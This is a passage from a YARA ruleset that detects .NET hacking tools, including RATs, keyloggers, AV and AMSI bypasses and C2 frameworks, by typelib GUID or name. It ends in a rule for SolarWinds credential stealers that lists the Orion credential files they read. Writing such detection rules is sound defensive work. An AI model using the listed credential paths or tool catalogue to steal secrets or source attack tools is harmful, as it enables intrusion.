\"3c9a6b88-bed2-4ba8-964c-77ec29bf1846\" ascii nocase wide\n        $typelibguid2 = \"4fcdf3a3-aeef-43ea-9297-0d3bde3bdad2\" ascii nocase wide\n        $typelibguid3 = \"361c69f5-7885-4931-949a-b91eeab170e3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_SharpHandler {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/jfmaes/SharpHandler\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"46e39aed-0cff-47c6-8a63-6826f147d7bd\" ascii nocase wide\n        $typelibguid1 = \"11dc83c6-8186-4887-b228-9dc4fd281a23\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_Driver_Template {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/FuzzySecurity/Driver-Template\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"bdb79ad6-639f-4dc2-8b8a-cd9107da3d69\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\nrule HKTL_NET_GUID_NashaVM {\n    meta:\n        description = \"Detects .NET red/black-team tools via typelibguid\"\n        reference = \"https://github.com/Mrakovic-ORG/NashaVM\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-21\"\n    strings:\n        $typelibguid0 = \"f9e63498-6e92-4afd-8c13-4f63a3d964c3\" ascii nocase wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them\n}\n\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or\n    organization, as long as you use it under this license.\n*/\n\n\n// low hanging fruits ;)\n\nrule HKTL_NET_NAME_FakeFileMaker {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/DamonMohammadbagher/FakeFileMaker\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"FakeFileMaker\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_Aggressor {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/k8gege/Aggressor\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"Aggressor\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_pentestscripts {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/c4bbage/pentestscripts\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"pentestscripts\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_WMIPersistence {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/mdsecactivebreach/WMIPersistence\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"WMIPersistence\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_ADCollector {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/dev-2null/ADCollector\"\n        hash = \"5391239f479c26e699b6f3a1d6a0a8aa1a0cf9a8\"\n        hash = \"9dd0f322dd57b906da1e543c44e764954704abae\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"ADCollector\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_MaliciousClickOnceGenerator {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/Mr-Un1k0d3r/MaliciousClickOnceGenerator\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"MaliciousClickOnceGenerator\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_directInjectorPOC {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/badBounty/directInjectorPOC\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"directInjectorPOC\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_AsStrongAsFuck {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/Charterino/AsStrongAsFuck\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"AsStrongAsFuck\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_MagentoScanner {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/soufianetahiri/MagentoScanner\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"MagentoScanner\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_RevengeRAT_Stub_CSsharp {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/NYAN-x-CAT/RevengeRAT-Stub-CSsharp\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"RevengeRAT-Stub-CSsharp\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_SharPyShell {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/antonioCoco/SharPyShell\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"SharPyShell\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_GhostLoader {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/TheWover/GhostLoader\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"GhostLoader\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_DotNetInject {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/dtrizna/DotNetInject\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"DotNetInject\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_ATPMiniDump {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/b4rtik/ATPMiniDump\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"ATPMiniDump\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_ConfuserEx {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/yck1509/ConfuserEx\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"ConfuserEx\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_SharpBuster {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/passthehashbrowns/SharpBuster\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"SharpBuster\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_AmsiBypass {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/0xB455/AmsiBypass\"\n\t\thash = \"8fa4ba512b34a898c4564a8eac254b6a786d195b\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"AmsiBypass\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_Recon_AD {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/outflanknl/Recon-AD\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"Recon-AD\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_SharpWatchdogs {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/RITRedteam/SharpWatchdogs\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"SharpWatchdogs\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_SharpCat {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/Cn33liz/SharpCat\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"SharpCat\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_aspnetcore_bypassing_authentication {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/jackowild/aspnetcore-bypassing-authentication\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"aspnetcore-bypassing-authentication\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_K8tools {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/k8gege/K8tools\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"K8tools\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_HTTPSBeaconShell {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/limbenjamin/HTTPSBeaconShell\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"HTTPSBeaconShell\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_Ghostpack_CompiledBinaries {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/r3motecontrol/Ghostpack-CompiledBinaries\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"Ghostpack-CompiledBinaries\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_metasploit_sharp {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/VolatileMindsLLC/metasploit-sharp\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"metasploit-sharp\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_trevorc2 {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/trustedsec/trevorc2\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"trevorc2\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_petaqc2 {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/fozavci/petaqc2\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"petaqc2\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_NativePayload_DNS2 {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/DamonMohammadbagher/NativePayload_DNS2\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"NativePayload_DNS2\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_cve_2017_7269_tool {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/zcgonvh/cve-2017-7269-tool\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"cve-2017-7269-tool\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_AggressiveProxy {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/EncodeGroup/AggressiveProxy\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"AggressiveProxy\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_MSBuildAPICaller {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/rvrsh3ll/MSBuildAPICaller\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"MSBuildAPICaller\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_GrayKeylogger {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/DarkSecDevelopers/GrayKeylogger\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"GrayKeylogger\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_weevely3 {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/epinna/weevely3\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"weevely3\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_FudgeC2 {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/Ziconius/FudgeC2\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"FudgeC2\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_NativePayload_Reverse_tcp {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/DamonMohammadbagher/NativePayload_Reverse_tcp\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"NativePayload_Reverse_tcp\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_SharpHose {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/ustayready/SharpHose\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"SharpHose\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_RAT_NjRat_0_7d_modded_source_code {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/AliBawazeEer/RAT-NjRat-0.7d-modded-source-code\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"RAT-NjRat-0.7d-modded-source-code\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_RdpThief {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/0x09AL/RdpThief\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"RdpThief\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_RunasCs {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/antonioCoco/RunasCs\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"RunasCs\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_NativePayload_IP6DNS {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/DamonMohammadbagher/NativePayload_IP6DNS\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"NativePayload_IP6DNS\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_NativePayload_ARP {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/DamonMohammadbagher/NativePayload_ARP\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"NativePayload_ARP\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_C2Bridge {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/cobbr/C2Bridge\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"C2Bridge\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_Infrastructure_Assessment {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/NyaMeeEain/Infrastructure-Assessment\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"Infrastructure-Assessment\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_shellcodeTester {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/tophertimzen/shellcodeTester\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"shellcodeTester\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_gray_hat_csharp_code {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/brandonprry/gray_hat_csharp_code\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"gray_hat_csharp_code\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_NativePayload_ReverseShell {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/DamonMohammadbagher/NativePayload_ReverseShell\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"NativePayload_ReverseShell\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_DotNetAVBypass {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/mandreko/DotNetAVBypass\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"DotNetAVBypass\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_HexyRunner {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/bao7uo/HexyRunner\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"HexyRunner\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_SharpOffensiveShell {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/darkr4y/SharpOffensiveShell\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"SharpOffensiveShell\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_reconness {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/reconness/reconness\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"reconness\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_tvasion {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/loadenmb/tvasion\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"tvasion\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_ibombshell {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/Telefonica/ibombshell\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"ibombshell\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_RemoteProcessInjection {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/Mr-Un1k0d3r/RemoteProcessInjection\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"RemoteProcessInjection\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_njRAT_0_7d_Stub_CSharp {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/NYAN-x-CAT/njRAT-0.7d-Stub-CSharp\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"njRAT-0.7d-Stub-CSharp\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_CACTUSTORCH {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/mdsecactivebreach/CACTUSTORCH\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"CACTUSTORCH\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_PandaSniper {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/QAX-A-Team/PandaSniper\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"PandaSniper\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_xbapAppWhitelistBypassPOC {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/jpginc/xbapAppWhitelistBypassPOC\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"xbapAppWhitelistBypassPOC\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\nrule HKTL_NET_NAME_StageStrike {\n    meta:\n        description = \"Detects .NET red/black-team tools via name\"\n        reference = \"https://github.com/RedXRanger/StageStrike\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-22\"\n    strings:\n        $name = \"StageStrike\" ascii wide\n        $compile = \"AssemblyTitle\" ascii wide\n    condition:\n        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}\n\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or\n    organization, as long as you use it under this license.\n*/\n\nrule HKTL_Solarwinds_credential_stealer {\n    meta:\n        description = \"Detects solarwinds credential stealers like e.g. solarflare via the touched certificate, files and database columns\"\n        reference = \"https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/solarwinds-raindrop-malware\"\n        reference = \"https://github.com/mubix/solarflare\"\n        author = \"Arnim Rupp\"\n        date = \"2021-01-20\"\n\t\thash = \"1b2e5186464ed0bdd38fcd9f4ab294a7ba28bd829bf296584cbc32e2889037e4\"\n\t\thash = \"4adb69d4222c80d97f8d64e4d48b574908a518f8d504f24ce93a18b90bd506dc\"\n    strings:\n        $certificate = \"CN=SolarWinds-Orion\" ascii nocase wide\n        $credfile1 = \"\\\\CredentialStorage\\\\SolarWindsDatabaseAccessCredential\" ascii nocase wide\n        $credfile2 = \"\\\\KeyStorage\\\\CryptoHelper\\\\default.dat\" ascii nocase wide\n        $credfile3 = \"\\\\Orion\\\\SWNetPerfMon.DB\" ascii nocase 